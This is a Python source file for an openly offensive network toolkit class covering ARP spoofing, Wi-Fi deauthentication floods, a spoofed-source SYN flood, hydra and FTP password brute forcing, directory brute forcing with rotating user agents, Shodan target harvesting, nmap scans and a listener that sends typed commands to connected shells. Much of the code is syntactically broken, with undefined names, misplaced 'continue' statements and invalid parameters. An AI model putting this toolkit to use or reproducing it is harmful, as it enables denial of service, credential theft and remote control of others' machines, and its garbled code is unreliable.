import shodan
import os
import time
import socket
import socketserver
import scapy
import requests as re
import subprocess
import arpspoof 
import paramiko
import webdictionarybrute
import anonymousFTP
import ftplib

global user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36',
        'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
        'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; ar) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)',
        'Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01',
        'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
        'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
   ]
    
os.system("sudo pip install scapy && pip install shodan && pip install paramiko")



class oasis:
    
    def arp_dos(client_mac, ap_mac, ifaceds):
        arpspoof.arp_spoof_dos(client_mac, ap_mac, ifaceds)

    def monitor_mode(vartord):
        if(vartord == True):
        os.system('sudo ifconfig wlan0 down')
        os.system('sudo ifconfig wlan0 mode monitor')
        else:
            print("[!] value not passed")
            pass
            
    def dic_brute(target, filelink):
        webdictionarybrute.filelinkscan(target, filelink)

    def dumpnetworks(interface):
        cmd = "airodump-ng " + interface
        os.system(cmd)

    def deauthpacket(targetip, routerip, ifaced, framecountd, intervald):
        if target_macd == null:
            target_macd = "ff:ff:ff:ff:ff:ff"
            continue
        dot11 = Dot11(addr1=get_mac(targetip), addr2=get_mac(routerip), addr3=get_mac(routerip))
        # stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        # send the packet
        sendp(packet, inter=intervald, count=framecountd, iface=ifaced, verbose=1)
        print("[!] - Sent Packet " + count)

    def sshLogin(host, username, password, str(command)):
        s_client = paramiko.client.SSHClient()
        s_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s_client.connect(host, username=username, password=password)
        _stdin, _stdout, _stderr = client.exec_command(command)
        data = _stdout.read().decode()
        print(str(data))
        client.close()

    def destoryev(target_ip, gateway_mac, iface, framecountb, intervalb):
        proc = str(input("Highly experimental, proceed? [Y/N]: "))
        if(proc == "Y" or "y" or "yes"):
            arpspoof.destroyev(target_ip, gateway_mac, iface, framecountb, interablb)
        else:
            continue

    def telnetLogin(): # use paramiko
        pass

    def anonymousFTPBRUTE(target, username, filelink, delay):
        anonymousftp.crack(target, filelink, username, delay)

    def sniffer(protocol, interface, countd):
        capture = sniff(iface=interface, count=countd)
        capture.summary()

    def arpspoof(targetip, routerip):
        arpspoof.arp_attack(targetip, routerip)

    def filelinkscan(target, filelink):
        with open(filelink) as file:
            file = file.readlines()
        for line in file:
            x = 0
            x += 0
            print("Checking" + x + line)
            response = re.get(
                target + line, headers={'User-Agent': user_agents[x % len(user_agents)]})
            if (response.status_code >= 200 and response.status_code <= 299):
                print(target + line + " " + str(response.status_code) +
                    " " + time.strftime("%H:%M:%S") + " OKKKKKKK DOMAIN")
                with open("gooddics.txt", "w") as f:
                    f.write(target + line + " " + str(response.status_code))
                    print("Good domain wrote to file")
            else:
                print(target + line + " " + str(response.status_code) +
                    " " + time.strftime("%H:%M:%S"))

    def hydraAutomation(usernamelist, passwordlist, targetip, service, outputfile):
        defconlol = "hydra -L " + usernamelist + " -P " + passwordlist + " " + targetip + " " + service + " -o " + outputfile
        os.system(defconlol)

    def shodanWrite(filenameO, apikey, searchquery):
        ipfile = open(filenameO, "w")
        api = shodan.Shodan(apikey)
        results = api.search(searchquery)

        for ip in results['matches']:
            ipfile.write(ip['ip_str'])
            time.sleep(0.3)
            ipfile.write('\n')
            print("added ip to " + filenameO)

    def slowlorisAtt(target_ip, target_port):
        ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected 
        send(p, loop=1, verbose=0)
        
    def nmap(ip):
        cmd = "nmap -sS -vv -O " + ip
        os.system(cmd).read()

    def quickmultihandler(ipIN, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(ipIN, port)
        s.listen(5)

        while True:
            conn, addr = s.accept()
            print('[!] ', conn, '-', addr, ' Connected!')
            while True:
                cmd = input(">> ")
                s.sendall(cmd.encode())
                print("[!] - Running Command")
                time.sleep(1)
                data = s.recv(1024)
                dataI = data.decode('utf-8')
                print(dataI)
                
     def listpingscan(fileIP, outputFile):
        fileI = open("fileIP", "r")
        lines = fileI.readlines()
        for line in lines:
            try:
                os.system("ping " + line)
                print("UP: " + line)
            else:
                print("DOWN: " + line)
